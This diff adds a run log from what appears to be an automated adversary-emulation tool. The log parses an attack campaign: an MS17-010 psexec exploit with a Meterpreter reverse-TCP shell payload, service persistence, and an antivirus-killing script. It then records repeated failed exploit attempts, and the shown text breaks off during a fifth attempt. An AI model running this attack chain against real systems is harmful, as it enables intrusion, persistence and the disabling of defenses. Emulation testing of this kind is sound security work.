@@ -1,0 +1,54 @@
+2020-03-30 23:32:13,891- attack-thread - INFO - ....................Parsing the Campaign....................
+2020-03-30 23:32:13,897- attack-thread - INFO - [{'TA01_T1190_P1': {'name': 'ms17_010_psexec', 'tactic': 'Initial_Access', 'try_count': 3, 'tool': 'metasploit', 'exploit': 'windows/smb/ms17_010_psexec', 'payload': 'windows/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'RHOSTS': 'RHOSTS_$ref'}}}, {'TA03_T1050_P1': {'name': 'persistence_service', 'tactic': 'Persistence', 'try_count': 1, 'tool': 'metasploit', 'exploit': 'windows/local/persistence_service', 'options': {'REMOTE_EXE_NAME': 'REMOTE_EXE_NAME_$ref', 'SERVICE_NAME': 'SERVICE_NAME_$ref', 'REMOTE_EXE_PATH': 'REMOTE_EXE_PATH_$ref', 'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'SESSION': 'SESSION_$ref'}}}, {'TA05_T1089_P2': {'name': 'killav', 'tactic': 'Defense_Evasion', 'try_count': 3, 'tool': 'meterpreter', 'type': 'script', 'script': 'post/windows/manage/killav'}}]
+2020-03-30 23:32:13,898- attack-thread - INFO - *****************************Check tools status*****************************
+2020-03-30 23:32:13,898- attack-thread - INFO - ['metasploit', 'metasploit', 'meterpreter']
+2020-03-30 23:32:13,899- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-30 23:32:13,900- attack-thread - INFO - msfconsole = [32mTrue[0m
+2020-03-30 23:32:13,900- attack-thread - INFO - meterpreter = [33mDEPENDS_ON_METASPLOIT[0m
+2020-03-30 23:32:13,921- attack-thread - INFO - No Exceptions Found
+2020-03-30 23:32:14,078- attack-thread - INFO - exploit['LHOST'] not needed...
+2020-03-30 23:32:14,078- attack-thread - INFO - exploit['LPORT'] not needed...
+2020-03-30 23:32:14,078- attack-thread - INFO - option not found in payloads
+2020-03-30 23:32:14,097- attack-thread - INFO - cid: 0
+2020-03-30 23:32:14,097- attack-thread - INFO - ....................Executing Exploit......................................
+2020-03-30 23:32:15,181- attack-thread - INFO - {'job_id': 0, 'uuid': 'p2pverh4'}
+2020-03-30 23:32:15,186- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:32:18,198- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:32:21,211- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:32:24,224- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:32:27,237- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:32:30,238- attack-thread - INFO - .........Executing Exploit again..........
+
+2020-03-30 23:32:30,238- attack-thread - INFO - ....................Executing Exploit......................................
+2020-03-30 23:32:31,248- attack-thread - INFO - {'job_id': 1, 'uuid': 'pzsmkhr3'}
+2020-03-30 23:32:31,253- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:32:34,265- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:32:37,278- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:32:40,292- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:32:43,320- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:32:46,322- attack-thread - INFO - .........Executing Exploit again..........
+
+2020-03-30 23:32:46,322- attack-thread - INFO - ....................Executing Exploit......................................
+2020-03-30 23:32:47,330- attack-thread - INFO - {'job_id': 2, 'uuid': '8ii9wnsb'}
+2020-03-30 23:32:47,336- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:32:50,348- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:32:53,359- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:32:56,372- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:32:59,383- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:33:02,386- attack-thread - INFO - .........Executing Exploit again..........
+
+2020-03-30 23:33:02,387- attack-thread - INFO - ....................Executing Exploit......................................
+2020-03-30 23:33:03,392- attack-thread - INFO - {'job_id': 3, 'uuid': '1vx4qdmt'}
+2020-03-30 23:33:03,397- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:33:06,410- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:33:09,422- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:33:12,433- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:33:15,443- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:33:18,446- attack-thread - INFO - .........Executing Exploit again..........
+
+2020-03-30 23:33:18,447- attack-thread - INFO - ....................Executing Exploit......................................
+2020-03-30 23:33:19,451- attack-thread - INFO - {'job_id': 4, 'uuid': 'o8ybd66e'}
+2020-03-30 23:33:19,456- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:33:22,468- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:33:25,480- attack-thread - INFO - Meterpreter Sessions list empty: {}
+2020-03-30 23:33:28,509- attack-thread - INFO - Meterpreter Sessions list empty: {}
